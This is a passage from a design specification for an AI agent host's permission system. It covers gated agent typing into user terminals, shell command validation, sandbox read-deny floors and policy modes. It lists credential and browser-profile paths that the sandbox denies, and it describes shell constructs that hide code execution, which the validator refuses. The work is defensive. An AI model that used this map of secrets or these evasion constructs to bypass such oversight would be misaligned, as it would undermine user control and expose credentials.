  content, tool structure and provenance, with what was committed, and a
  changed row counts as new content unless its transform declared itself and
  the row is exactly that transform's output: a stale tool-result truncation
  must equal the one host rewrite (`staleToolResultRewrite`, which eviction and
  mark-stale both use) applied to the committed row, and a metadata-only change
  must leave the content digest unchanged. In-place metadata changes go through
  the history's `updateRowMeta`. Composer guidance counts as the user's own words
  only when it carries the same one-shot keyboard intent a send consumes; a
  queue flush or any call without that intent is another principal's. A
  missing, forged, consumed or expired intent token is never rescued by the
  browser's lingering user activation, for a guide or a send. Host-computed
  principal and taint facts retain the forced-floor behavior in the
  [decision tree](permission-decision-tree.md); a session surface choice does
  not clear them. The final PTY write, disclosed output span and terminal_read
  continuation remain bound to the exact current turn. Turn end ends the lease.
- **Target.** Two records must both say workspace: the mount's declared purpose
  (every spawn and replay declares `workspace` or `side-panel`) and main's own
  layout record of the window, where the tab sits in a workspace pane rather than
  the side panel ([browser-tab-registry.ts](../../src/main/browser/browser-tab-registry.ts)
  `surfacePlacement`). A renderer purpose that contradicts the layout record
  grants nothing, and a placement change in that record is a binding change. The
  shell must be zsh or bash with authenticated integration; a shell with no
  prompt marker yet (for example while `compinit` runs) refuses with that reason.
  pwsh integration attests directory and exit status, but agent typing into pwsh
  is refused (no bracketed paste) and its strip says so. Typing needs a fresh
  attested empty prompt with bracketed paste, the exact incarnation, the pane
  binding and the control lease below.
- **Decision.** The host terminal uses the shared [per-session surface choice](#user-owned-surface-choices), independently of the browser choice. The command
  and physical cwd remain host-computed policy subjects. Existing deny rules,
  admission, true other-principal/taint and exfiltration floors still apply.
  The session choice replaces the intrinsic per-command human/exact-rule
  requirement; remembered generic or exact shell grants do not bypass it.
  Auto uses the dedicated logical-consistency review, not general shell risk
  heuristics. Headless denies. A native card names the recipient terminal,
  shell, command and physical directory; its valid answer never authorizes a
  different recipient or turn.
- **Execution recheck.** Before typing, main rechecks the session, turn, binding,
  placement, incarnation, shell, control generation, the shell's reported
  directory and its device/inode. Any change refuses. The invocation runner
  seals the host shell execution route the permission decision saw (route
  `host`, its path-policy relaxations); a host that would now route shell
  effects elsewhere is refused before the card.
- **Final effect check.** At each check before an agent write (the reset, the
  paste, Enter), the typing protocol rebuilds the execution route and then,
  after that await and with nothing asynchronous before the write, re-proves
  the sealed directory identity (reported directory, realpath, device and
  inode): a relaxation or route that differs from the decision fails with the
  path-policy mismatch error. Either refusal writes nothing further; after the
  paste it clears the line with one Ctrl-C while the lease holds.
- **Control lease.** Admission takes one generation-bound agent lease. Every
  agent byte passes the lease check at the final PTY write. Any user input
  (except an exact emulator reply), **Take over**, **Stop**, a purpose or
  placement change, a changed binding, the turn's end or the shell's exit
  revokes it synchronously, before the user's bytes reach the shell. User input,
  Take over, Stop, a purpose or binding change move the control generation even
  with no lease, so a card still pending for that terminal types nothing once
  approved. Stop sends one Ctrl-C only for the lease's own block: at once while
  it runs, or, when Enter was pressed but the shell has not started it yet, once
  when it starts. That deferred interrupt is bound to the Stop's control
  generation, the incarnation and the lease's turn: user input, a new prompt,
  any later control change (placement, binding, take-over), the turn's end or
  10 seconds without a start drop it. A turn stopped after the paste but before Enter clears the line with
  one Ctrl-C while the lease holds. After a take-over the agent cannot type again
  until the user presses **Hand back** at an empty, quiet attested prompt; vi
  mode, a right-hand prompt or a not-found handler do not block it. A refusal
  names the prompt's state (unsent input, a running command, waiting for a
  prompt, no integration, exited). Hand back resumes nothing, and a side panel
  mount shows no hand-back strip.
- **Disclosure.** Output is attributed at PTY receipt: only bytes that arrive
  while the lease holds enter that command's span, at most 96K characters (the
  newest kept), and a revocation drops the undelivered parser tail. The exit code
  is returned only when the authenticated exit marker arrived under the lease.
  The span returns only to the requesting conversation in the user turn that ran
  it (`terminal_read` continuations by block id); at most 8 spans are kept per
  incarnation. If the
  shell runs a different command or directory than approved, disclosure stops,
  the mismatch is audited and the terminal is taken over. Bytes already written
  to the operating system cannot be retracted.

The interaction comparison is [Warp's take-over controls and
optional auto-approval](https://docs.warp.dev/agents/capabilities/agent-profiles-permissions/).
The useful comparison is visible control transfer. Ave's host path requires
exact command admission and bounded output disclosure; it does not adopt
auto-approval or full terminal-buffer sharing.

### Agent-changed file review

Host terminals, including the agent-inaccessible side-work-panel terminal, show
an advisory inline warning when a command uses a file with concrete successful
agent-write evidence from this application session. Direct scripts and sourced
files, target recipes in makefiles, package scripts and their referenced scripts,
and physical local-bin entry points (only where a package runner puts them on
PATH) are matched conservatively. A runner matches only in a proven executing
form: every option before the operand is on a short per-runner list, and an
option that takes a value has one the list validates (a shell's `-o errexit`,
`make -j N` with a positive count, `-s`, `-C dir`, `-f file`, `--silent`
before a package runner's subcommand, `npx --no-install`). A package runner
given `--version`, `-v`, `--help` or `-h` anywhere in its arguments runs no
script, and a command word is looked up only among the listed runners, never
among object properties. Any other option or value, including dry runs,
version or help output, syntax checks, preloads and variable assignments, is
uncertain and never a positive match: precision wins over recall. The command
continues without a confirmation dialog. Only a positive match to at least one
agent-changed file warns: commands with no file reference, shell-integration and
prompt internals, and unresolved dynamic indirection never do. The warning is
an inline annotation on the matched command's own row, drawn as a renderer-only
terminal decoration after the command text like a trailing shell comment. Main
names each authenticated command block on the C marker it regenerates for the
view, together with a per-terminal view token it hands only to the renderer and
never to the shell; the renderer anchors nothing without that token, so program
output cannot forge an anchor in any OSC encoding. Nothing is written to the
shell, the PTY or the terminal buffer, so no rows are taken and the annotation
scrolls with its block until its row leaves the scrollback. The annotation
starts after the command text, measured in cells, and never covers it: on a
long command row it shrinks to the warning and its button, then to the warning
glyph alone, and a row the command fills gets none (the badge still counts the
file). Only the latest command that matched offers [view changes]; earlier
matches remain as dim history text, and later commands that matched nothing
leave the button where it is. The changes view carries one static note that
detection is best-effort; subprocess writes without concrete path evidence and
dynamic indirection are not claimed covered. Provenance is advisory and is
never permission or terminal authority.

The agent-changed badge appears once, in the terminal's header or tab, and
counts the agent-changed files this terminal's commands used. The badge and
[view changes] open the terminal's 변경 파일 (changed files) view with the clicked
file selected; no panel is drawn inside the terminal's output. In a workspace
pane the view is a tab of the pane's work panel, next to the pane's chat: the
same docked column, card and push-aside layout as a conversation pane's work
panel. A side-work-panel terminal shows it in place of the shell, with a way
back; the PTY outlives the switch. The view reuses the conversation's change
UI (the file tree's rows, `TurnChangeDetail` and `FileEditDiff`) in a
matched-only mode: it lists exactly the files main delivered, with no filter,
no folder browsing and no workspace listing call, so it cannot reach a path the
terminal never executed. Each file's text is bounded at 1 MiB and a snapshot's
review text at 4 MiB in all; files past that are listed without a diff. Main sends
each file's change as a turn-review entry built against the recorded
baseline, and a file without one shows that its diff is unavailable: this view
never falls back to reading the file. There is no review or acknowledgement state:
the change has already happened, so the count follows the set of changed files
and never drops on a user action. Canonical physical paths retain session
attribution across symlink aliases and delete/restore. Each attributed write
records the identity (device, inode, birth time) that fstat gives on the
writer's own descriptor: the atomic text write's temporary file (whose inode the
rename moves), the source descriptor `move_file` holds across its rename, or the
descriptor an owned transfer created the file with. The path is never re-opened
to identify it, so a swap between the write and its recording cannot enter the
ledger. A write with no descriptor to report (a no-clobber copy, a document
app's save, any other mutation) records no identity and shows no diff. The diff
reads only through a non-following open whose descriptor has the recorded
identity; it never relies on repeated path checks, so a parent swapped for a
link at any point, or a save that replaced the inode, shows no diff until the
agent writes the path again. The baseline (the text before the write) is
captured only when the read provably came from the file the path names in its
physical parent: a non-following open whose descriptor's identity equals
`lstat` of the path before and after the read, with the parent's identity and
realpath unchanged across it; otherwise no baseline is stored and the change
has no diff. A parent swapped and swapped back entirely between two of those
checks is not detectable without `openat`. That residual is accepted because
review text is display-only: it leaves main only through the terminal's
fileReviews IPC to the renderer views that draw it, and no tool result, model
context, observation feed or `terminal_read` path reads it (a static test pins
this, and the view's reference controls are disabled). At worst the user sees,
in their own app, text of a file they can already read. Deleting a file does not
erase its historical evidence. Evidence lives only in memory for the running
application; restarting clears it. Command use is inferred from command blocks and static
file contents, rather than proof of operating-system file opens.

### Isolated shell readiness and command checks

The directory the shell reports is text on the terminal's output stream, so
it is checked against the operating system before the rules, the approval
scope or project rules use it
([shell-process.ts](../../src/main/terminal/shell-process.ts)). The terminal's
foreground process group must be the shell itself: the process spawned on
the pty, matched by pid and program name, so neither a program running in
front of it nor a nested shell of the same name passes. That process's working
directory, symlinks resolved, must equal the reported one. On macOS the
foreground group comes from `ps`, and the working directory comes from
`lsof -d cwd`. Node cannot call `proc_pidinfo` without a native addon, and
`lsof` is the stock unprivileged reader of that call. Linux verification follows
the inner-PTY checks below. An unsupported backend refuses the call. The
comparison directory in the approval scope is the verified one.

On macOS every wrapper before the shell (the pty trampoline, `env`,
`sandbox-exec`, `bash -c`) execs in place, so the pty's process is the shell.
On Linux the sandbox runs under `bwrap --new-session --unshare-pid`, kept as
bubblewrap's defense against TIOCSTI input injection, so nothing in the
sandbox holds the pty node-pty opened. The shell runs on a pty of its own that
util-linux `script` opens inside the sandbox
([terminal-inner-pty.ts](../../src/main/terminal/terminal-inner-pty.ts)), as
`su --pty` does for the same problem: Ctrl-C, job control and readline
behave as on any terminal, and a shell on the outer pty (where Ctrl-C killed
bubblewrap and with it the whole terminal) is never started; a host without
util-linux `script` gets no isolated conversation PTY, with the reason; the host shell remains
available. The check reads `/proc`:
- the shell is found by walking down from the pty's process along the one
  chain the wrap builds (`bwrap`, `bwrap`, `bash` with the runtime's `socat`
  bridges beside it, `apply-seccomp` twice, `script`, then the shell, by
  name), one child per step. Only the verified outer bridge launcher's side
  pids are exempt; extra children under a reaper are refused regardless of
  their program names;
- its innermost `NSpid` must equal the `Pid=` (`$$`) the prompt's `P` marker
  reported, so the markers and the process are the same shell;
- the foreground group of its own pty must be the shell itself;
- it must have no child process: a command still finishing, or a background
  job, which could write to the terminal or type into the line through
  TIOCSTI on that pty, is refused (`shell-busy`). Any other process on that
  pty sharing the shell's session or foreground group is also busy, including
  processes that have been reparented;
- its working directory must be the reported directory by device and inode,
  not by path: the sandbox mounts directories of its own (an empty tmpfs over a
  read-denied one) at paths the host also has.

The command is typed only at an empty prompt, as the shell's own command
markers report it ([terminal-blocks.ts](../../src/main/terminal/terminal-blocks.ts)
`promptState`). Refused with the reason, before the card and again at
execution:

- a running command or full-screen program;
- the user's unsent typing at the prompt, or any keystroke in the last 1.5
  seconds;
- a shell between prompts, or a zsh or bash still drawing its first prompt
  (the model is told to retry in a moment);
- an exited shell or a shell that emits no markers;
- a shell that does not mark the end of its prompt (fish), which is not
  supported;
- a line editor that does not take bracketed paste as plain text, or one with
  vi key bindings. Each prompt reports both (`Keys=`, `Paste=` in its `P`
  marker). zsh reports paste only while `zle_bracketed_paste` is set and the
  `bracketed-paste` and `self-insert` widgets are still the builtins (so
  `bracketed-paste-magic` and `url-quote-magic` count as no paste), and
  reports none while a right-hand prompt (`RPROMPT`) is set: zle draws it
  after the end of the prompt, where it would read as the user's typing at
  every prompt. A shell that reported no paste is refused for that before
  the typing checks below. bash
  reports it while readline has `enable-bracketed-paste on`, which the
  startup file turns on for bash 4.4 and later. Bash before 4.4, such as
  macOS `/bin/bash` 3.2, has none.
- a shell with a command-not-found handler (`command_not_found_handle` in
  bash, `command_not_found_handler` in zsh), reported as `NotFound=` in the
  `P` marker; a shell that does not report it counts as having one
  (`not-found-handler`). The shell runs the handler for any word that is not
  a command, so a line the rules read as running nothing would run the
  handler's code. Ubuntu's `/etc/bash.bashrc` defines one for every
  interactive bash when the `command-not-found` package is installed (it runs
  `/usr/lib/command-not-found`). Ave neither removes nor wraps the handler:
  the user's own typing keeps it, and the refusal tells the model to ask the
  user to run `unset -f command_not_found_handle` (bash) or
  `unfunction command_not_found_handler` (zsh) in that terminal, which
  removes it for that shell only. Wrapping it for typed lines alone was
  rejected: the shell cannot tell a pasted line from the user's own.

Executable shell registries (functions, aliases, command hashes and widgets)
cannot be assigned or appended to by an agent line, including indirect writes
and declaration or registration builtins. A handler cannot be installed earlier
on the same approved line after a prompt reported no handler.

Typing is a fixed protocol (pty-manager `typeLineAtPrompt`):
1. Check the prompt state.
2. Check the shell and its directory with the operating system.
3. Write Ctrl-C. The tty (on Linux, the shell's own pty inside the sandbox)
   turns it into SIGINT, which clears the line editor
   whatever its state: an ESC or Ctrl-X prefix waiting for its next key, a
   half-typed line.
4. Wait for the fresh prompt, then check the directory and the state again.
   bash 5.2 clears the line at once but draws the fresh prompt only when the
   interrupt breaks its wait for a key, so a Ctrl-C that arrives while the
   prompt is still being drawn leaves no fresh prompt until the next key.
   Ctrl-C is sent again every half second until a fresh prompt is drawn
   (3 seconds in all), and after more than one, typing waits until no further
   prompt arrives for a full 500 ms inside that same 3-second budget. Each
   resend checks unchanged user-input generation, foreground shell identity,
   absence of shell children, and the approved directory with the OS. A user
   keystroke aborts immediately, even if the shell redraws its prompt. The OS
   check runs again immediately before pasting. Query the shell's actual
   editable buffer through the integration-owned Ctrl-X Ctrl-V binding and
   require an authenticated empty-buffer acknowledgement for this prompt.
   The prompt must attest the owned binding and original handler; otherwise
   refuse without sending the query. Bash also verifies the active standard
   emacs keymap and reinstalls this reserved key before attesting it, because
   its command-binding registry can retain an entry after a keymap file
   replaces the actual key. A replaced handler or same-name alias is refused.
5. Paste the line between bracketed-paste markers, without Enter.
6. Wait until the line editor's echo of its edit line (wrapping removed) is
   exactly the approved line, then query the actual editable buffer again.
   Enter requires a fresh authenticated acknowledgement containing exactly
   the approved line, unchanged prompt and user-input generation, and another
   OS check. A query widget can repaint the display without changing the
   buffer: the exact echo is checked before querying, and the fresh actual
   buffer acknowledgement supplies the final content check. Its generation
   and content must remain unchanged through the final OS check.
   The private acknowledgement is removed from display and
   scrollback. Otherwise clear the line with Ctrl-C only while the same
   untouched shell remains safe, and refuse (`edit-line-mismatch`).

Inside a paste, the line editor inserts the text and does not read it as
keys. Raw typing after a pending ESC ran `[200~echo hi there~` in place of
`echo hi there` in a real zsh.

Once the shell reports starting the command (its `C` marker, waited for up
to 3 seconds whatever `waitSeconds` is), the line it recorded is compared with
the approved text, even while the command is still running. A difference fails
the call. No `C` marker means the call fails as not verified. It also
writes an audit row with the session, the terminal and the SHA-256 of both
texts. Known false-difference sources, both history options that neither
the terminal's startup file nor the macOS system files set, and that a typed
command cannot set (options are shell state):
- bash records the line through `history 1`. Under `HISTCONTROL=ignorespace`
  (or `ignoreboth`), a line typed with a leading space is not saved, and the
  record shows the previous line.
- zsh hands its hook the line as history will save it. Under
  `HIST_REDUCE_BLANKS`, `echo   a` is recorded as `echo a`.

Both fail closed: the call reports a failure for a command that ran as
approved.

The markers that the hooks print (`D`, `P`, `A`, `C`) carry a per-terminal
nonce, so printed text cannot forge them. The nonce reaches the shell in an
owner-only file in the terminal's sandbox HOME. The startup file reads it into
an unexported shell variable and deletes the file before the first prompt.
The nonce is never in the environment, which other processes can read. Only
the hook functions read it, and they print only to the terminal. bash 4.4 and
later print `C` from `PS0`, which bash writes before running the line,
outside any redirection the line makes. A DEBUG trap would run inside a
group's redirection, so `{ cmd; } > f` would capture the marker.

`B` marks the end of the prompt text, so it comes from the prompt string
itself: the line editor redraws the prompt on a resize or Ctrl-L without
running a hook. Prompt expansion can print anything in the prompt string
(`print -P "$PS1"`, `${PS1@P}`), so `B` never carries the nonce. It carries a
token the hook draws fresh from `/dev/urandom` for each prompt and announces
in that prompt's nonce-carrying `P`. The tracker accepts a `B` only with the
current token, and only while that prompt is up:
- The first `B` ends the prompt.
- A repeated `B` is a redraw: the echo starts over, and the prompt count and
  any typing stay.
- A `B` printed while a command runs is ordinary output.

A command can therefore print only its own prompt's token, during its run,
when it is refused, or a stale one afterwards.

Residual risk: a process that is still running while the next prompt is up
and can read the shell's current state. That means a background job asking
the shell itself (not a copy made when it forked), or reading the shell's
memory, such as `/proc/<pid>/mem` under a permissive `ptrace_scope`. The
validator refuses every way for a command to expand or list shell state (see
below). Nothing else runs at a prompt except the hooks.

The 1.5-second quiet window is a heuristic. A key written to the PTY shows in
the echo only after the shell reads it, so an empty echo just after typing
proves nothing; the window covers that gap. A key the user presses after the
final check, while the approved line is being written, can still mix with
it. Replies the terminal emulator sends by itself on the same channel (focus
in/out, device-attribute, status and cursor-position reports, OSC/DCS
answers) do not count as typing. A cursor-position report and Shift+F3 have
the same shape, so that key does not count either.

The text must be one line that every supported shell runs exactly as shown and
as the rules read it
([terminal-command-text.ts](../../src/shared/terminal-command-text.ts)). Refused
before any card, with no mode that lets them through:

- control characters (newline, tab, ESC and bracketed-paste markers included);
- characters a reader cannot see: format and default-ignorable characters,
  non-ASCII spaces, the braille blank, combining marks on ASCII, and
  whitespace runs longer than 16;
- history expansion (`!word` outside single quotes and `$'…'`, unescaped; a
  leading `^`; the `r` and `fc` re-run commands). Inside double quotes both
  shells expand it, so it stays refused there;
- constructs zsh and bash read differently:
  - an unquoted `#` comment. A `#` inside a `${…}` expansion (`${#x}`,
    `${x#p}`) is an operator, not a comment. The terminal's zsh also runs
    with `interactivecomments`;
  - a word starting with `=`, which zsh replaces with a program's path, as an
    argument, a redirect target or a loop value;
  - zsh parameter flags: `$=x`, `$+x`, `$~x`, `$^x` and their `${…}` forms;
  - the precommand modifiers `nocorrect`, `noglob` and `-`;
  - `repeat` and `foreach`;
  - an assignment word after `command` or `builtin`;
  - the clobbering redirect `>!`;
  - a command made only of redirections, where zsh runs `$NULLCMD` or
    `$READNULLCMD`.

  A differential test found these
  ([terminal-command-differential.test.ts](../../src/main/terminal/__tests__/terminal-command-differential.test.ts)).
  It takes every command of a corpus that the validator accepts and the
  classifier sees in full: the existing cases and their mutations, about
  3,000 commands. Each one runs in a real interactive zsh and bash with the
  terminal's startup file, xtrace on, and a PATH of recording shims. The test
  fails on any program or builtin that ran without the classifier having
  evaluated it with those words. That includes commands the classifier
  marks as hiding code. The terminal's shell reads only its integration
  startup file and the system's, never the user's own, so aliases, functions
  and options from the user's startup files do not apply. Aliases and options
  the user sets by hand in that terminal (such as `setopt extendedglob`) are
  theirs, and this check does not cover them;
- anything that would change the shell for the user's later commands:
  - function definitions;
  - assignments to prompt and hook variables, `PATH`, `IFS`, `TMOUT` and
    similar, written as `NAME=value` or made through `read`, `mapfile`,
    `readarray`, `getopts` or `printf -v` (a variable name taken from a
    variable counts as one of them);
  - builtins that install aliases, traps, hooks, options, key bindings,
    limits, a umask, terminal settings or scheduled commands, edit the
    history, or source code;
  - callback text passed to `mapfile`/`readarray -C`, completion or style
    callbacks, and other builtins that evaluate strings outside the parsed
    command. Formatted printing cannot assign through `%n` or evaluate
    nonliteral numeric operands; variable-name operands cannot hide arithmetic
    or command substitutions in subscripts;
- references to the shell integration's `__ave_*` names; block records also
  redact the marker nonce, so printed text cannot forge markers;
- anything that prints the shell's own state:
  - prompt expansion (`print -P`, `echo -P`, `${…@P}`);
  - any reference to the prompt, hook or line-editor variables (`PS0`–`PS9`,
    `PROMPT*`, `RPROMPT*`, `PROMPT_COMMAND`, `*_functions`, `zle_*`,
    `widgets`), so `echo $PS1` and `printf '%s' "$PS1"` are treated alike;
  - bash's `${…@A}`/`${…@K}` declaration dumps;
  - variable listings: `export`, `readonly`, `integer` or `float` with nothing
    to declare or with `-p`, and `compgen`. `set`, `typeset`, `declare` and
    `local` are refused already;
  - `vared`;
  - `print -z` (the line editor's buffer stack) and `print -s`/`-S` (the
    history). `history` itself is refused as shell state;
- a construct the shell analysis does not model (`case`,
  `declare`/`typeset`/`local`, `let`, `((…))`, `select`, `coproc`), a glob
  with parentheses (zsh glob qualifiers such as `*(e:'cmd':)` and `*(+cmd)`
  run code), and a command name taken from a variable;
- an incomplete construct.

The card shows the exact command. It names by code point each character that
can look like another
([terminal-command-lookalikes.ts](../../src/shared/terminal-command-lookalikes.ts)).
That covers a non-ASCII character that is not a letter, fullwidth and
halfwidth forms, and the letters of a word that mixes scripts the way no
writing system does, such as Latin with Cyrillic or Greek. This follows the
"highly restrictive" mixed-script level of Unicode TS #39. A word in a single
script, such as a Korean filename, gets no warning.

Within the script mixes that are allowed, some characters still pass for ASCII
or for each other, and the card names these too:

- standalone Hangul jamo, such as U+3161 for a dash or U+3163 for `l` or `|`;
  a Korean word is written in syllables, so these are named wherever they
  appear;
- a short list of one- and two-stroke Han and kana characters drawn from the
  TS #39 confusables, such as U+4E00, U+4E28, U+53E3 and U+30A8. These are
  named only in a word that also holds ASCII letters or digits, or that is
  made of nothing else. Inside ordinary Chinese or Japanese words they are
  not flagged.

The card also notes when the terminal's directory is outside the allowed
folders. The host seals that directory as the allowed-directory check compares
it: symlinks resolved, and case folded where the file system folds case. The
card can therefore compare it with the allowed folders as plain strings.

## Default Allowed Roots

Layer 1 seeds its allow-list from the project root, the application data root
(`aveHome()`) and the application scratch directory, as
[allowed-directories.ts](../../src/permissions/allowed-directories.ts)
computes them. The scratch directory
([ave-scratch.ts](../../src/shared/ave-scratch.ts)) is `ave-scratch-<uid>`
under the platform temp root: boot creates it with `0o700`, and it is offered —
to the model in the environment block of the system prompt as
`scratchDirectory`, and to the allow-list — only while it still verifies as a
real directory (not a symlink) that this account owns and no other account can
read. The check is a per-call `lstat` at each offer, not a guarantee across the
gap to the write itself. The name is keyed by uid and a digest of the
application home, so an isolated `AVE_HOME` gets its own scratch directory. A
directory another local account planted first under a shared `/tmp` fails the
check and is reported at boot; the prompt then says no scratch directory is
available, and nothing substitutes the temp root for it. The rule classifier
does not treat depth below the verified scratch root as a signal, so a staged
build tree there is graded like any other scratch write. The platform temp roots themselves are not a Layer 1 default; the
conversation loop adds them to its per-turn base set
([base-allowed-directories.ts](../../src/permissions/base-allowed-directories.ts)),
where the world-writable `/tmp` tradeoff is stated. Protected credential/control
paths retain their admission or forced-floor behavior, and `permissions.additionalDirectories`
extends the list rather than replacing it.

The pinned `@anthropic-ai/sandbox-runtime` patch removes unconditional write
grants for `/tmp/claude`, `/private/tmp/claude`, `<real home>/.npm/_logs` and
`<real home>/.claude/debug` on every platform. Device write defaults remain.
The four paths follow Ave's configured write grants, symlink resolution and
generic sensitive-path floors; they have no dedicated compensating write denies.
Runtime `TMPDIR` stays under the application-owned sandbox temp root, and
plugin-owned processes receive only their principal's temp directory.

Linux wraps keep the host temp tree visible. A shell granted `/tmp` can create
a top-level entry that the host and later sandboxed commands see. The legacy
`/tmp/claude` path follows that same grant. A plugin without a covering write
grant cannot write there. Its existence, type or owner does not require host
reservation or prevent the workload from starting. Normal filesystem access
checks still apply.

## Saved-Session Reads

Tool policy permits reads of the configured primary session store and denies
write and delete effects. Its root comes from
[sessionStorePath](../../src/shared/session-store-path.ts) under the application
data root resolved by `aveHome()`; `AVE_HOME` relocation applies to storage and
read policy together. This grants no access to another session-store namespace,
credentials, audit or routine state.

The per-turn environment context publishes the exact application root and
primary session-store path as JSON through the same path helpers. These are
operational tool inputs; audit path redaction does not apply to them. The model
uses the absolute store path with `list_files` and `read_file` rather than
inferring it from a shell's temporary HOME. Publishing a path does not grant
access or change shell expansion and permission checks.

[sensitive-paths.ts](../../src/permissions/sensitive-paths.ts) owns the namespace
classification and canonical-path checks. Supported file reads and shell
commands with proven read effects can reach this root even when ordinary reads
are confined to working directories. A linked session root or an escaping path
cannot widen that grant, and other sensitive-path rules still apply inside it.
Only the builtin shell wrapper receives that root through
`getBuiltinShellSessionReadPolicy` in
[asrt-sandbox.ts](../../src/permissions/asrt-sandbox.ts). The global read-deny
floor still protects sessions from confined plugin, MCP and terminal processes.
The builtin projection retains other sensitive paths, nested exclusions and
trusted custom read denies; a conflicting protected ancestor suppresses the
session grant. `getBuiltinShellReadPolicy` composes broad invocation reads for
both shell dialects without denying the real home as a whole. The protected
floor that stands in for a whole-home deny is the anchored row set of
`SENSITIVE_PATH_ENTRIES` in
[sensitive-paths.ts](../../src/permissions/sensitive-paths.ts); the host guard
and every OS sandbox wrap project the same rows, so each one is denied on macOS,
Linux and Windows. Besides SSH, cloud, git and package-manager credentials and
shell histories, the floor covers keychains and keyrings
(`~/Library/Keychains`, `~/.local/share/keyrings`, `~/.local/share/kwalletd`),
password managers (`~/.password-store`, `~/.config/op`, and the 1Password 7/8
group containers `~/Library/Group Containers/2BUA8C4S2C.com.{agilebits,1password}`),
the macOS cookie jar (`~/Library/Cookies`), the Safari container
(`~/Library/Containers/com.apple.Safari`), Thunderbird profiles
(`~/Library/Thunderbird`, `~/.thunderbird`, `%APPDATA%\Thunderbird`) and whole
browser profile roots. On macOS these are the `Google` vendor parent under
`~/Library/Application Support` (every Chrome channel, so a new channel is
covered too), Edge and its Beta/Dev/Canary channels, Brave, Chromium, Arc,
Vivaldi, Opera, Opera GX and Firefox. On Linux they are `~/.mozilla`,
`~/.config/<browser>` including the `google-chrome-beta`/`-unstable` and
`microsoft-edge-beta`/`-dev` channels, the snap homes
`~/snap/{firefox,chromium,brave,thunderbird}` and the Flatpak homes under
`~/.var/app` for Firefox, Chromium, Chrome, Brave, Edge and Thunderbird. On
Windows they are `%LOCALAPPDATA%\<vendor>\User Data` including Chrome
Beta/Dev/SxS and Edge Beta/Dev/SxS, `%APPDATA%\Opera Software` and
`%APPDATA%\Mozilla\Firefox\Profiles`, beside the Windows Credential
Manager, DPAPI, Crypto and Vault rows. Firefox and Linux Chromium profiles keep
their decrypting key (`key4.db`, the `Local State` key) beside the store. The
macOS keychain databases are encrypted under the login password instead; they
are rows for parity with main, whose builtin shell denies the whole real HOME.
The earlier Keychains/Cookies exclusion was written under that whole-home deny,
and keeping it without the deny would leave them more exposed than on main.
As on main, keychain-backed credential helpers fail inside the sandboxed shell:
git `osxkeychain`, `security`, docker credential helpers, the 1Password `op`
CLI, `pass`, and keychain-based `codesign`. They still work in an approved
unsandboxed run. The `Google` parent also hides the other Google app data
there (for example Android Studio settings and GoogleUpdater) from sandboxed
commands.
A floored read fails visibly with the native permission error. Read candidates
cannot reopen another protected deny; write
grants and the sensitive write-deny floor remain intact.
Removing a read-deny pattern alone
does not establish this contract: both the file gates and actual sandboxed reads
must enforce the same boundary. Structured transfers retain their write-effect
checks on both endpoints.

## Structured File Transfers

`copy_path` declares `sourcePath` and `destinationPath`; `extract_archive` declares `archivePath` and `destinationPath`. Both tools are builtin writes, and both endpoint fields are declared in `pathFields`. The executor resolves these paths for the existing scope checks and write approval. Approval reuse is bound to the semantic operation and both resolved paths.

At execution, [file-access-policy.ts](../../src/tools/file-access-policy.ts) applies the existing FileTool gate with a write effect to both endpoints and every reached child. A transfer's source therefore remains confined to the invocation's admitted `cwd` and extra allowed directories even when ordinary reads are unfenced. Sensitive-path checks, canonical resolution and existing path grants retain their usual authority. Outside requests use the existing approval route; the tools do not grant themselves access or widen the roots. Allow mode does not bypass these checks.

The [structured transfer contract](architecture.md#structured-file-transfers) defines the absent exact destination, ownership, supported entries and cleanup limits. These tools add no shell exemption: recursive shell copying, archive creation and shell extraction remain denied. Guidance can recommend `copy_path` for supported copying or `extract_archive` for tar/gzip extraction; ZIP extraction and archive creation remain unavailable.

## Policy Modes

| Stored ID | Display name | Behavior |
| --- | --- | --- |
| `strict` | Default / 기본 | New-install default. Ordinary reads and proven sandboxed read-only shells pass; writes and other shells ask. Secret reads, network and non-read-only MCP tools ask. |
| `default` | Allow writes / 쓰기 허용 | Allows eligible checkpoint-backed project writes and safe confined shells. Other requests use approval. |
| `auto` | auto | Allow writes behavior plus automatic review for ordinary requests that would ask. LOW/MEDIUM allow; HIGH, error, abort or breaker fallback use a normal card. |
| `allow` | Allow / 허용 | Allows ordinary requests; admission denies, explicit deny rules and forced one-shot floors remain authoritative. Safe mutating confined shells retain the sandbox-auto outcome. |

Stored IDs are stable. Existing users with persisted `default` keep Allow writes behavior; no existing mode is reset to the new-install default. The complete matrix and precedence live in the [decision tree](permission-decision-tree.md#mode-behaviour-matrix-owner-clarification-2026-10-30). Host/escalated shell state wins over read-only evidence.

### Project file writes

Owner decision 2026-10-29 makes reversible project edits the lowest-friction
file-tool tier. The comparison motivating the decision is that agent hosts pair
in-workspace edits with recovery while reserving separate consent for external
writes and protecting control files in every mode. Ave uses its per-turn code
checkpoints and `restoreCodeCheckpoint` for that recovery boundary. A refused automatic
mutation preserves earlier before-images and blocks further automatic writes
in that active turn, so a retry returns to the ordinary approval route.

In default and auto-review modes, a builtin file-tool write is allowed without
an approval card only when every touched lexical and canonical path is inside
the session cwd or a configured `additionalDirectories` root, and the write's
code checkpoint is available. Application home, temporary roots and scratch
roots do not become project roots through the broader allowed-directory list;
existing scratch auto-approval remains separate. Move and regular-file copy
operations must cover both endpoints. A regular-file copy can use
checkpoint-backed allowance when its source is a single-link regular
file within the checkpoint size limit and both endpoints are in the project.
Directory copy and archive extraction keep the ordinary approval route and
their existing source-path, entry and transfer checks. They can
create directory trees, but the code checkpoint ledger restores regular files
and has no safe directory-tree ownership contract for removing created
directories without removing unrelated later files. Their transfer journal does
not supply that rewind contract.

An unavailable checkpoint does not itself force a human card: it leaves the
ordinary default-mode approval and auto-review reviewer routing unchanged.
Other mandatory floors can still require explicit human approval. Subagent
sessions and sessions with persistence disabled have no durable checkpoint turn
and use that ordinary route. A live child invalidates its parent's active turn
because concurrent child writes have no coordinated before-images; that turn
remains unavailable after the child exits, while a fresh parent turn can regain
checkpoint eligibility. Brokered and remote writes likewise gain no new
checkpoint-based allowance. Explicit grants keep their existing authority after
all mandatory floors; being inside the project alone supplies no transfer grant.

Availability preflight checks storage and file metadata and size bounds without
reading target contents or hydrating saved images. The mutation boundary
captures and validates before-images. Automatically allowed execution also
re-resolves canonical paths against the project roots, failing if a parent
symlink swap has moved a target outside those roots.

This category rule runs after credential-store admission denial, explicit deny and ask
rules, corrupt-store handling, remote-controller one-shot consent, the scoped
Edit protected-control-path and project-escape floors, staged/overlay origin
checks, and strict mode. Checkpoint eligibility does not replace admission or forced one-shot gates.
Strict mode asks for writes; ordinary reads remain allowed. Headless requests
